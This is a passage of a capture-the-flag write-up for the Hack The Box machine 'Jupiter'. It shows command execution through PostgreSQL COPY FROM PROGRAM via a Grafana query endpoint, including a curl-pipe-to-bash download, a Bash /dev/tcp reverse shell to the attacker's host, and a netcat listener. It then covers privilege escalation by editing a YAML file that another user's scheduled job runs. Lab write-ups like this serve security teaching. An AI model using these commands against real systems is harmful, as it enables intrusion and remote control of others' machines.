+POST requests are being sent to <code>/api/ds/query</code>. If we inspect the data we are sending, we can observe the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/5.png"/><br/><br/>
+There is an SQL query, and it appears to be targeting a database endpoint of the API. This seems quite promising. After conducting some research online, I came across a method to execute commands in PostgreSQL. However, it's worth noting that this method only works if the server is running PostgreSQL version 9.3 to 11.2, as detailed in this <a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5">article</a>.<br/><br/>
+It's important to emphasize that this isn't a vulnerability by default, as command execution relies on the presence of a privilege (<code>pg_execute_server_program</code>) that must be manually assigned to the user. Nevertheless, if the privilege is active, and an attacker gains control over a user with this privilege, it could lead to command execution.<br/><br/>
+We can attempt to retrieve the PostgreSQL version by sending the following query:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/6.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/7.png"/><br/><br/>
+It's running PostgreSQL version 14.8. Now, let's verify if the user can execute commands:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolname</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolsuper</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolinherit</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcreaterole</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcreatedb</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcanlogin</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolconnlimit</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolvaliduntil</span><span class="p">,</span><span class="w"> </span><span class="nb">ARRAY</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">rolname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_auth_members</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_roles</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">roleid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">oid</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">member</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">oid</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">memberof</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolreplication</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_roles</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/8.png"/><br/><br/>
+Upon examining the response, we ascertain that we have the ability to execute commands, as we possess the 'pg_execute_server_program' privilege.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/9.png"/><br/><br/>
+In order to execute commands, we need to begin by creating a table:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/10.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/11.png"/><br/><br/>
+Now, let's verify if we can execute commands. To do this, we'll start by listening with an HTTP server on port 80:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Now, let's send the following query:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">COPY</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">'curl 10.10.16.3'</span><span class="p">;</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/12.png"/><br/><br/>
+If we monitor our listener, we can observe the request originating from the victim's machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.216</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">21</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">21</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+</pre></div>
+
+Now, let's send a reverse shell to our machine. To achieve this, I will create a <code>pwned.sh</code> file with a one-liner for a Bash reverse shell:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pwned</span><span class="o">.</span><span class="n">sh</span>
+<span class="c1">#!/bin/bash </span>
+<span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.3</span><span class="o">/</span><span class="mi">3001</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+Our current approach is to send a GET request to our HTTP server, which we will host using Python, targeting the <code>pwned.sh</code> file and interpreting its contents using <code>bash</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Let's set up our netcat listener on port 3001:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+</pre></div>
+
+Now, using the following query, we will send the reverse shell:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">COPY</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">'curl 10.10.16.3/pwned.sh|bash'</span><span class="p">;</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/13.png"/><br/><br/>
+Now, checking our listener, we've successfully received the reverse shell:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.216</span><span class="p">:</span><span class="mf">56186.</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1570</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span>
+</pre></div>
+
+We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span>  <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span>  <span class="o">^</span><span class="n">Z</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+
+<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+                               <span class="n">reset</span>
+<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
+<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span>
+</pre></div>
+<h3><br>Shell as juno</br></h3><br>
+Let's begin with a basic system enumeration. First, we'll search for other users on the system:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
+<span class="n">total</span> <span class="mi">8</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">6</span> <span class="n">jovian</span> <span class="n">jovian</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span> <span class="mi">18</span><span class="p">:</span><span class="mi">59</span> <span class="n">jovian</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">8</span> <span class="n">juno</span>   <span class="n">juno</span>   <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span> <span class="mi">12</span><span class="p">:</span><span class="mi">10</span> <span class="n">juno</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span>
+</pre></div>
+
+There are two users with home directories. Now, let's search for SUID files:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">libexec</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount3</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="n">main</span><span class="err">$</span>
+</pre></div>
+
+There are no noteworthy SUID files to exploit. Now, let's examine the system's capabilities:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> 
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="err">$</span>
+</pre></div>
+
+Nothing of interest found here.<br/><br/>
+Now, let's list tasks that are executed at regular intervals. For this purpose, we can utilize tools like <a href="https://github.com/DominicBreuker/pspy">pspy</a>. I've downloaded a release version, specifically <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64">pspy64</a>.<br/><br/>
+After uploading pspy to the victim machine, let's run it:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="o">./</span><span class="n">pspy</span>
+</pre></div>
+
+After a short wait, I came across this:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/14.png"/><br/><br/>
+Juno is running a binary that I can't access, and it is including a file in the <code>/dev/shm</code> directory. Upon examining 'network-simulation.yml,' it's evident that commands specified in this file are being executed.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
+<span class="n">general</span><span class="p">:</span>
+  <span class="c1"># stop after 10 simulated seconds</span>
+  <span class="n">stop_time</span><span class="p">:</span> <span class="mi">10</span><span class="n">s</span>
+  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
+  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
+  <span class="c1"># time when running non-blocking system calls</span>
+  <span class="n">model_unblocked_syscall_latency</span><span class="p">:</span> <span class="n">true</span>
+
+<span class="n">network</span><span class="p">:</span>
+  <span class="n">graph</span><span class="p">:</span>
+    <span class="c1"># use a built-in network graph containing</span>
+    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
+    <span class="nb">type</span><span class="p">:</span> <span class="mi">1</span><span class="n">_gbit_switch</span>
+
+<span class="n">hosts</span><span class="p">:</span>
+  <span class="c1"># a host with the hostname 'server'</span>
+  <span class="n">server</span><span class="p">:</span>
+    <span class="n">network_node_id</span><span class="p">:</span> <span class="mi">0</span>
+    <span class="n">processes</span><span class="p">:</span>
+    <span class="o">-</span> <span class="n">path</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span>
+      <span class="n">args</span><span class="p">:</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+      <span class="n">start_time</span><span class="p">:</span> <span class="mi">3</span><span class="n">s</span>
+  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
+  <span class="n">client</span><span class="p">:</span>
+    <span class="n">network_node_id</span><span class="p">:</span> <span class="mi">0</span>
+    <span class="n">quantity</span><span class="p">:</span> <span class="mi">3</span>
+    <span class="n">processes</span><span class="p">:</span>
+    <span class="o">-</span> <span class="n">path</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">curl</span>
+      <span class="n">args</span><span class="p">:</span> <span class="o">-</span><span class="n">s</span> <span class="n">server</span>
+      <span class="n">start_time</span><span class="p">:</span> <span class="mi">5</span><span class="n">s</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+It's creating an HTTP server and making a curl request to <code>server</code>. Since I can modify this file, let's execute something as 'Juno':<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
+<span class="n">general</span><span class="p">:</span>
+  <span class="c1"># stop after 10 simulated seconds</span>
+  <span class="n">stop_time</span><span class="p">:</span> <span class="mi">10</span><span class="n">s</span>
+  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
+  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
+  <span class="c1"># time when running non-blocking system calls</span>
+  <span class="n">model_unblocked_syscall_latency</span><span class="p">:</span> <span class="n">true</span>
+
+<span class="n">network</span><span class="p">:</span>
+  <span class="n">graph</span><span class="p">:</span>
+    <span class="c1"># use a built-in network graph containing</span>
+    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
+    <span class="nb">type</span><span class="p">:</span> <span class="mi">1</span><span class="n">_gbit_switch</span>
+
+<span class="n">hosts</span><span class="p">:</span>
+  <span class="c1"># a host with the hostname 'server'</span>
+  <span class="n">server</span><span class="p">:</span>
+    <span class="n">network_node_id</span><span class="p">:</span> <span class="mi">0</span>
+    <span class="n">processes</span><span class="p">:</span>
+    <span class="o">-</span> <span class="n">path</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">touch</span>
+      <span class="n">args</span><span class="p">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">pwned</span>
+      <span class="n">start_time</span><span class="p">:</span> <span class="mi">3</span><span class="n">s</span>
+  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
+  <span class="n">client</span><span class="p">:</span>
+    <span class="n">network_node_id</span><span class="p">:</span> <span class="mi">0</span>
+    <span class="n">quantity</span><span class="p">:</span> <span class="mi">3</span>
+    <span class="n">processes</span><span class="p">:</span>
+    <span class="o">-</span> <span class="n">path</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">curl</span>
+      <span class="n">args</span><span class="p">:</span> <span class="o">-</span><span class="n">s</span> <span class="n">server</span>
+      <span class="n">start_time</span><span class="p">:</span> <span class="mi">5</span><span class="n">s</span>
+<span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+I modified the file and changed the command to execute <code>/usr/bin/touch</code> in order to create a file named 'pwned' in the <code>/tmp</code> directory. Assuming it runs as 'Juno,' the owner of the file should be 'Juno.' After a minute, the 'pwned' file was indeed created by 'Juno':<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span>
+<span class="n">total</span> <span class="mi">28</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">juno</span> <span class="n">juno</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">48</span> <span class="n">pwned</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">snap</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="n">tmp</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">11</span><span class="n">b86a004cc9404da525889a457fbf82</span><span class="o">-</span><span class="n">grafana</span><span class="o">-</span><span class="n">server</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">dedBZv</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">11</span><span class="n">b86a004cc9404da525889a457fbf82</span><span class="o">-</span><span class="n">ModemManager</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">ubZajL</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">11</span><span class="n">b86a004cc9404da525889a457fbf82</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">logind</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">ipkoNs</span>
